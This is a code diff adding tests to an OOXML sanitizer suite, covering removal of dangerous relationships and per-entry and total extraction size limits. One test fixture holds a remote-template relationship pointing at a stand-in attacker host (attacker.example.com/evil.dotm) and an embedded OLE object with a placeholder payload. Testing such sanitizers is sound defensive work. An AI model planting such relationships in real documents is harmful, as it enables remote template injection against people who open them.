@@ -191,4 +191,44 @@ describe("OoxmlSanitizer", () => {
     expect(custom.name).toBe("OOXML Sanitizer");
     expect(typeof custom.sanitize).toBe("function");
   });
+
+  test("removes dangerous relationships written with single quotes or paired tags", async () => {
+    const rels = `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+<Relationship Id='rId1' Type='http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate' Target='http://attacker.example.com/evil.dotm' TargetMode='External'></Relationship>
+<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="media/evil.bin"></Relationship>
+<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com/normal" TargetMode="External"/>
+</Relationships>`;
+    const original = await zip([
+      ["word/_rels/document.xml.rels", rels],
+      ["word/media/evil.bin", "FAKE-OLE-PAYLOAD"],
+    ]);
+
+    const result = await OoxmlSanitizer.sanitize(original);
+    const names = await readZipEntryNames(result.buffer);
+    const relsXml = await readZipEntryText(result.buffer, "word/_rels/document.xml.rels");
+
+    expect(names).not.toContain("word/media/evil.bin");
+    expect(relsXml).not.toContain("attacker.example.com");
+    expect(relsXml).not.toContain("evil.bin");
+    expect(relsXml).toContain("normal");
+  });
+
+  test("refuses to extract an OOXML part beyond the configured size limit", async () => {
+    const original = await zip([
+      ["word/document.xml", "x".repeat(1024)],
+    ]);
+    const limited = createOoxmlSanitizer({ maxEntryBytes: 16 });
+
+    await expect(limited.sanitize(original)).rejects.toThrow(/extraction limit/i);
+  });
+
+  test("refuses an OOXML package whose total extracted size exceeds the limit", async () => {
+    const original = await zip([
+      ["a.xml", "a".repeat(512)],
+      ["b.xml", "b".repeat(512)],
+    ]);
+    const limited = createOoxmlSanitizer({ maxEntryBytes: 1024, maxTotalBytes: 600 });
+
+    await expect(limited.sanitize(original)).rejects.toThrow(/total extraction limit/i);
+  });
 });
